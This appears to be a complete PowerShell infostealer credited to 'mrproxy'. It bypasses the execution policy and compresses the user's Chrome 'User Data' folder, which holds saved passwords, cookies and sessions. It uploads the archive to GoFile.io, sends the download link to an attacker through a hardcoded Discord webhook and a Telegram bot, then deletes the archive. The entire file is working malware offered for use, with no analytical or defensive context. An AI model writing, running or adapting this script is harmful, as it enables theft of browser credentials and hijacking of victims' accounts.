# Ensure execution policy is bypassed
Set-ExecutionPolicy Bypass -Scope Process -Force

# Created by mrproxy
$botToken = "your-telegram-bot-token"   # Replace with your Telegram bot token
$chatID = "your-chat-id"               # Replace with your Telegram chat ID
$webhook = "https://discord.com/api/webhooks/1337216489618542663/z9sFeu7hQPxBUEZ81XN_CHsT3eOSQnAV7XraeCcMJFrkYugTolNcnztAnLbiq516mTB0"  # Replace with your Discord Webhook URL

# Debug log file
$logFile = "$env:TEMP\debug_log.txt"

# Function for sending messages through Telegram Bot
function Send-TelegramMessage {
    param (
        [string]$message
    )

    if ($botToken -and $chatID) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{
            chat_id = $chatID
            text = $message
        }

        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
            Add-Content -Path $logFile -Value "Message sent to Telegram: $message"
        } catch {
            Add-Content -Path $logFile -Value "Failed to send message to Telegram: $_"
        }
    } else {
        Send-DiscordMessage -message $message
    }
}

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
        Add-Content -Path $logFile -Value "Message sent to Discord: $message"
    } catch {
        Add-Content -Path $logFile -Value "Failed to send message to Discord: $_"
    }
}

# Function to upload file and get download link
function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Get URL from GoFile
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
    if ($serverResponse.status -ne "ok") {
        Add-Content -Path $logFile -Value "Failed to get server URL: $($serverResponse.status)"
        return $null
    }

    # Define the upload URI
    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"

    # Prepare the file for uploading
    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -InFile $filePath -ContentType "multipart/form-data"
        if ($response.status -ne "ok") {
            Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
            return $null
        }

        Add-Content -Path $logFile -Value "File uploaded successfully: $($response.data.downloadPage)"
        return $response.data.downloadPage
    } catch {
        Add-Content -Path $logFile -Value "Failed to upload file: $_"
        return $null
    }
}

# Function to use Windows' built-in compression
function Zip-WithWindows {
    param (
        [string]$sourceFolder,
        [string]$zipPath
    )

    # Create a compressed folder
    $shell = New-Object -ComObject Shell.Application
    $zipFile = $shell.NameSpace($zipPath)

    if (-not $zipFile) {
        # Create an empty ZIP file
        Set-Content $zipPath ([System.Byte[]]@(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
        Start-Sleep -Seconds 1
        $zipFile = $shell.NameSpace($zipPath)
    }

    # Add files to ZIP
    $source = $shell.NameSpace($sourceFolder).Items()
    $zipFile.CopyHere($source)

    # Wait to finish
    Start-Sleep -Seconds 5
}

# Define paths
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$outputZip = "$env:TEMP\chrome_data.zip"

# Use built-in compression instead of 7-Zip
Zip-WithWindows -sourceFolder $chromePath -zipPath $outputZip

# Upload the file and get the link
$link = Upload-FileAndGetLink -filePath $outputZip

# Send the download link
if ($link -ne $null) {
    Send-DiscordMessage -message "Download link: $link"
    Send-TelegramMessage -message "Download link: $link"
    Add-Content -Path $logFile -Value "Download link sent: $link"
} else {
    Send-DiscordMessage -message "Failed to upload file to GoFile.io"
    Add-Content -Path $logFile -Value "Failed to upload file to GoFile.io"
}

# Remove the zip file after uploading
Remove-Item $outputZip -Force
Add-Content -Path $logFile -Value "Deleted zip file after upload."
